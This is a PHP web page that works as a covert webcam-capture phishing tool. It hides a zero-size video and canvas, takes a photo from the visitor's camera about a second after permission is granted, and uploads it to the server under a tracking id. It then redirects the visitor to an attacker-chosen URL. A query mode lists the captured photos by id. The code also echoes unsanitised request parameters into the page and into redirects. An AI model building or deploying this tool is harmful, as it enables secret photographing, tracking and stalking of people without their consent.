<?php if ($_GET['op'] == 'query') : ?>
    <div style="width: 90%; margin: 10px auto; border: 1px solid #ccc; text-align: center">
        <?php
        error_reporting(0);
        $type = trim($_GET['type']);
        $page = isset($_GET['page']) ? $_GET['page'] : 0; //从零开始
        $id = trim($_GET['id']);
        $imgnums = 3;    //每页显示的图片数
        $path = "img/";   //图片保存的目录

        $handle = opendir($path);
        $i = 0;
        while (false !== ($file = readdir($handle))) {
            list($filesname, $ext) = explode(".", $file);
            if ($ext == "png" and explode('_', $filesname)[0] == $id) {
                if (!is_dir('./' . $file)) {
                    $array[] = $file; //保存图片名称
                    ++$i;
                }
            }
        }
        if ($array) {
            rsort($array); //修改日期倒序排序
        } else {
            echo "该ID下没有任何照片 <br /><br />";
        }
        for ($j = $imgnums * $page; $j < ($imgnums * $page + $imgnums) && $j < $i; ++$j) {
            echo '<div>';
            echo "<img src=" . $path . "/" . $array[$j] . "><br /><br />";
            echo '</div>';
        }
        $realpage = @ceil($i / $imgnums) - 1;
        $Prepage = $page - 1;
        $Nextpage = $page + 1;
        if ($Prepage < 0) {
            echo "上一页 ";
            echo "<a href=?op=query&page=$Nextpage&id=$id>下一页</a> ";
            echo "<a href=?op=query&page=$realpage&id=$id>末页</a> ";
        } elseif ($Nextpage >= $realpage) {
            echo "<a href=?op=query&page=0&id=$id>首页</a> ";
            echo " <a href=?op=query&page=$Prepage&id=$id>上一页</a> ";
            echo " 下一页";
        } else {
            echo "<a href=?op=query&page=0&id=$id>首页</a> ";
            echo "<a href=?op=query&page=$Prepage&id=$id>上一页</a> ";
            echo "<a href=?op=query&page=$Nextpage&id=$id>下一页</a> ";
            echo "<a href=?op=query&page=$realpage&id=$id>末页</a> ";
        }
        ?>
    </div>
<? else : ?>
    <!DOCTYPE html>
    <html>

    <head>
        <meta charset="UTF-8">
        <title>...请给权限...</title>
    </head>

    <body>

        <video id="video" width="0" height="0" autoplay></video>
        <canvas style="width:0px;height:0px" id="canvas" width="480" height="640"></canvas>
        <script type="text/javascript">
            window.addEventListener("DOMContentLoaded", function() {
                var canvas = document.getElementById('canvas');
                var context = canvas.getContext('2d');
                var video = document.getElementById('video');

                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({
                        video: true
                    }).then(function(stream) {
                        video.srcObject = stream;
                        video.play();

                        setTimeout(function() {
                            context.drawImage(video, 0, 0, 480, 640);
                        }, 1000);
                        setTimeout(function() {
                            var img = canvas.toDataURL('image/png');
                            document.getElementById('result').value = img;
                            document.getElementById('gopo').submit();
                        }, 1300);
                    }, function() {
                        alert("无权限");
                    });

                }
            }, false);
        </script>
        <form action="?id=<?php echo $_GET['id'] ?>&url=<?php echo $_GET['url'] ?>" id="gopo" method="post">
            <input type="hidden" name="img" id="result" value="" />
        </form>
    </body>

    </html>
<? endif; ?>

<?php
if (isset($_POST['img'])) {
    $base64_img = trim($_POST['img']);
    $id = trim($_GET['id']);
    $url = trim($_GET['url']);
    $up_dir = "./img/"; //存放在当前目录的img文件夹下

    (empty($id) || empty($url) || empty($base64_img)) && exit;

    if (!file_exists($up_dir)) {
        mkdir($up_dir, 0777);
    }

    if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_img, $result)) {
        $type = $result[2];
        if (in_array($type, array('bmp', 'png'))) {
            $new_file = $up_dir . $id . '_' . date('mdHis_') . '.' . $type;
            file_put_contents($new_file, base64_decode(str_replace($result[1], '', $base64_img)));
            header("Location: " . $url);
        }
    }
}
